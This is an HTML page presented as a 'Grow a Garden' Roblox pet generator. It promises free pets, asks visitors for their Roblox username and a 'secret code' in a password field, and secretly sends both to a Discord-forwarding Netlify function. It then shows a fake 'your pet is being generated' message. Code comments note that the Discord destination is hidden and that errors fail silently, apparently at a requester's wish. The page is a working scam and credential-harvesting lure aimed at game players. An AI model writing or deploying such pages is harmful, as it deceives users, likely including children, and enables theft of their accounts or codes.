<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Grow a Garden — Pet Generator</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg1:#a8e6cf; --bg2:#dcedc1; --bg3:#ffd3b6;
    --green:#2d6a4f; --green-2:#40916c; --green-3:#52b788; --text:#194b36;
    --card:#ffffff; --shadow:0 10px 30px rgba(0,0,0,.12);
    --radius:18px;
  }
  *{box-sizing:border-box}
  html,body{margin:0}
  body{
    font-family:Poppins, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    color:var(--text);
    min-height:100vh;
    /* Garden gradient + subtle pattern */
    background:
      radial-gradient(30% 30% at 10% 10%, rgba(255,255,255,.35) 0%, rgba(255,255,255,0) 60%),
      radial-gradient(25% 25% at 90% 20%, rgba(255,255,255,.35) 0%, rgba(255,255,255,0) 60%),
      linear-gradient(135deg, var(--bg1), var(--bg2) 45%, var(--bg3));
  }
  header{
    padding:28px 20px 10px;
    text-align:center;
  }
  h1{
    margin:0 0 8px; font-size:clamp(28px,3.5vw,44px); color:var(--green);
  }
  .subtle{opacity:.75}

  .wrap{
    max-width:1200px; margin:0 auto; padding:20px;
    display:grid; grid-template-columns: 2fr 1fr; gap:28px;
  }
  @media (max-width: 960px){ .wrap{grid-template-columns:1fr} }

  .panel{
    background:var(--card); border-radius:var(--radius); box-shadow:var(--shadow); overflow:hidden;
  }
  .panel .head{
    padding:18px 22px; border-bottom:1px solid rgba(0,0,0,.06); background:linear-gradient(180deg,#fff, #f7fff8);
    font-weight:700; color:var(--green);
  }
  .panel .body{ padding:20px; }

  /* Pet grid */
  .grid{
    display:grid; gap:22px;
    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  }
  .card{
    background:#fff; border-radius:16px; box-shadow:var(--shadow); overflow:hidden;
    transform:translateY(0); transition:transform .25s ease, box-shadow .25s ease;
  }
  .card:hover{ transform:translateY(-4px); box-shadow:0 14px 36px rgba(0,0,0,.16); }
  .thumb{
    aspect-ratio: 4 / 3; width:100%; object-fit:cover; display:block;
  }
  .card .meta{ padding:14px 16px 18px; text-align:center; }
  .name{ font-weight:700; font-size:18px; margin-bottom:8px }
  .btn{
    appearance:none; border:0; border-radius:12px; padding:12px 16px; font-weight:600; cursor:pointer;
    background:var(--green-2); color:#fff; transition:transform .1s ease, background .2s ease, box-shadow .2s ease;
    box-shadow: 0 6px 16px rgba(32,124,92,.25);
  }
  .btn:hover{ background:#2f7f5f }
  .btn:active{ transform:translateY(1px) }

  /* Instructions */
  .instructions p{ margin:.6em 0; line-height:1.6 }
  .instructions ol{ margin:.3em 0 .6em 1.25em }
  .instructions li{ margin:.35em 0 }

  /* Modal (Generate → Form) */
  .modal{
    position:fixed; inset:0; display:grid; place-items:center; padding:20px;
    background:rgba(0,0,0,.55); opacity:0; pointer-events:none; transition:opacity .25s ease;
    z-index:999;
  }
  .modal.show{ opacity:1; pointer-events:auto }
  .sheet{
    width:min(92vw, 520px); background:#fff; border-radius:20px; box-shadow:var(--shadow); overflow:hidden;
    transform:translateY(18px) scale(.98); opacity:0; transition:transform .28s cubic-bezier(.2,.8,.2,1), opacity .28s ease;
  }
  .modal.show .sheet{ transform:translateY(0) scale(1); opacity:1 }
  .sheet .top{ padding:18px 20px; background:linear-gradient(180deg,#f8fff9,#f2fff6); border-bottom:1px solid rgba(0,0,0,.06) }
  .sheet .cnt{ padding:22px; text-align:center }
  .sheet img{ width:220px; border-radius:14px; margin:10px auto 14px; display:block }
  .row{ display:flex; gap:10px; justify-content:center; }
  .input{
    width:100%; max-width:320px; padding:12px 14px; border-radius:12px; border:1px solid #dde6df; font-size:16px;
    outline:none; transition:border .2s ease, box-shadow .2s ease;
  }
  .input:focus{ border-color:#9bd1b8; box-shadow:0 0 0 4px rgba(155,209,184,.25) }
  .btn-wide{ width:100%; max-width:320px; font-size:18px; padding:14px 16px; }

  .x{
    background:transparent; border:0; font-size:20px; line-height:1; padding:8px 12px; cursor:pointer; color:#6b6b6b;
  }
  .x:hover{ color:#333 }

  /* Popup */
  .popup{
    position:fixed; inset:0; display:grid; place-items:center; padding:20px;
    background:rgba(0,0,0,.55); opacity:0; pointer-events:none; transition:opacity .25s ease;
    z-index:1000;
  }
  .popup.show{ opacity:1; pointer-events:auto }
  .popcard{
    width:min(92vw, 500px); background:#fff; border-radius:20px; box-shadow:var(--shadow); padding:26px; text-align:center;
    transform:translateY(12px) scale(.98); opacity:0; transition:transform .28s cubic-bezier(.2,.8,.2,1), opacity .28s ease;
  }
  .popup.show .popcard{ transform:translateY(0) scale(1); opacity:1 }
  .muted{ opacity:.8 }

  /* Tiny badge */
  .badge{
    display:inline-block; padding:6px 10px; border-radius:999px; background:#e9f7ef; color:#2d6a4f; font-size:12px; font-weight:700;
  }
</style>
</head>
<body>
<header>
  <h1>🌱 Grow a Garden — Pet Generator</h1>
  <div class="subtle">Pick a pet, generate it, then wait ~10–15 minutes for it to appear in Grow a Garden.</div>
</header>

<div class="wrap">
  <!-- LEFT: PETS -->
  <section class="panel">
    <div class="head">Choose Your Pet</div>
    <div class="body">
      <div class="grid" id="pet-grid">
        <!-- Replace images/names as you wish -->
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1526318472351-c75fcf070305?q=80&w=1200&auto=format&fit=crop" alt="Pet 1">
          <div class="meta">
            <div class="name">Pet 1</div>
            <button class="btn" onclick="selectPet('Pet 1','https://images.unsplash.com/photo-1526318472351-c75fcf070305?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6?q=80&w=1200&auto=format&fit=crop" alt="Pet 2">
          <div class="meta">
            <div class="name">Pet 2</div>
            <button class="btn" onclick="selectPet('Pet 2','https://images.unsplash.com/photo-1501004318641-b39e6451bec6?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1493411737930-cd24f21d2357?q=80&w=1200&auto=format&fit=crop" alt="Pet 3">
          <div class="meta">
            <div class="name">Pet 3</div>
            <button class="btn" onclick="selectPet('Pet 3','https://images.unsplash.com/photo-1493411737930-cd24f21d2357?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1519681393784-d120267933ba?q=80&w=1200&auto=format&fit=crop" alt="Pet 4">
          <div class="meta">
            <div class="name">Pet 4</div>
            <button class="btn" onclick="selectPet('Pet 4','https://images.unsplash.com/photo-1519681393784-d120267933ba?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1452570053594-1b985d6ea890?q=80&w=1200&auto=format&fit=crop" alt="Pet 5">
          <div class="meta">
            <div class="name">Pet 5</div>
            <button class="btn" onclick="selectPet('Pet 5','https://images.unsplash.com/photo-1452570053594-1b985d6ea890?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
        <article class="card">
          <img class="thumb" src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6?q=80&w=1200&auto=format&fit=crop" alt="Pet 6">
          <div class="meta">
            <div class="name">Pet 6</div>
            <button class="btn" onclick="selectPet('Pet 6','https://images.unsplash.com/photo-1501004318641-b39e6451bec6?q=80&w=1200&auto=format&fit=crop')">Select Pet</button>
          </div>
        </article>
      </div>
    </div>
  </section>

  <!-- RIGHT: INSTRUCTIONS -->
  <aside class="panel instructions">
    <div class="head">How to get your pet generation code</div>
    <div class="body">
      <!-- Edit these instructions freely -->
      <p><span class="badge">Step 1</span> Join our Roblox group.</p>
      <p><span class="badge">Step 2</span> Complete the in-game mini-quest to receive your code.</p>
      <p><span class="badge">Step 3</span> Return here, choose a pet, and click <b>Generate Pet</b>.</p>
      <p><span class="badge">Step 4</span> Enter your Roblox username and the secret code.</p>
      <p class="muted">Your request is processed—check <b>Grow a Garden</b> after 10–15 minutes.</p>
    </div>
  </aside>
</div>

<!-- Modal -->
<div class="modal" id="modal">
  <div class="sheet" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
    <div class="top" style="display:flex;align-items:center;justify-content:space-between;">
      <div id="modalTitle" style="font-weight:700;color:var(--green)">Generate Your Pet</div>
      <button class="x" aria-label="Close" onclick="closeModal()">✕</button>
    </div>

    <!-- Step 1: Confirm pet & generate -->
    <div class="cnt" id="step-generate">
      <h2 id="chosen-name" style="margin:.2em 0 .4em"></h2>
      <img id="chosen-img" alt="">
      <button class="btn btn-wide" onclick="showForm()">Generate Pet</button>
      <div class="muted" style="margin-top:10px">You’ll enter your Roblox username & code next.</div>
    </div>

    <!-- Step 2: Form -->
    <div class="cnt" id="step-form" style="display:none">
      <h3 style="margin:.2em 0 .8em">Enter your details</h3>
      <input class="input" id="roblox-username" type="text" placeholder="Roblox Username" autocomplete="username">
      <input class="input" id="secret-code" type="password" placeholder="Secret Code" autocomplete="one-time-code">
      <button class="btn btn-wide" id="submitBtn" onclick="submitAdoption()">
        <span id="submitText">Submit</span>
        <span id="spinner" style="display:none;margin-left:8px">⏳</span>
      </button>
    </div>
  </div>
</div>

<!-- Popup -->
<div class="popup" id="popup">
  <div class="popcard">
    <h2>🎉 Your pet is being generated</h2>
    <p class="muted">Please wait for 10–15 minutes then check <b>Grow a Garden</b>.</p>
    <button class="btn" onclick="closePopup()">Okay</button>
  </div>
</div>

<script>
  const ENDPOINT = "/.netlify/functions/send-to-discord";
  let selectedPet = null;

  function selectPet(name, img){
    selectedPet = { name, img };
    document.getElementById("chosen-name").textContent = "You chose: " + name;
    const el = document.getElementById("chosen-img");
    el.src = img; el.alt = name;
    openModal();
  }

  function openModal(){
    const m = document.getElementById("modal");
    m.classList.add("show");
    document.getElementById("step-generate").style.display = "";
    document.getElementById("step-form").style.display = "none";
  }

  function closeModal(){
    document.getElementById("modal").classList.remove("show");
  }

  function showForm(){
    document.getElementById("step-generate").style.display = "none";
    document.getElementById("step-form").style.display = "";
    document.getElementById("roblox-username").focus();
  }

  function showPopup(){
    document.getElementById("popup").classList.add("show");
  }
  function closePopup(){
    document.getElementById("popup").classList.remove("show");
  }

  async function submitAdoption(){
    const btn = document.getElementById("submitBtn");
    const spinner = document.getElementById("spinner");
    const text = document.getElementById("submitText");
    const username = document.getElementById("roblox-username").value.trim();
    const code = document.getElementById("secret-code").value.trim();
    if(!username || !code) return;

    // visual loading
    btn.disabled = true; spinner.style.display = "inline-block"; text.textContent = "Sending...";

    try{
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({
          username, code,
          pet: selectedPet?.name || "Unknown",
          img: selectedPet?.img || ""
        })
      });
      closeModal();
      showPopup(); // Just the nice popup (no mention of Discord)
    }catch(e){
      // Fail silently per your request (no alerts); re-enable button quietly
      console.error(e);
    }finally{
      btn.disabled = false; spinner.style.display = "none"; text.textContent = "Submit";
    }
  }

  // ESC closes modal
  window.addEventListener("keydown", (e)=>{ if(e.key==="Escape") closeModal(); });
</script>
</body>
</html>
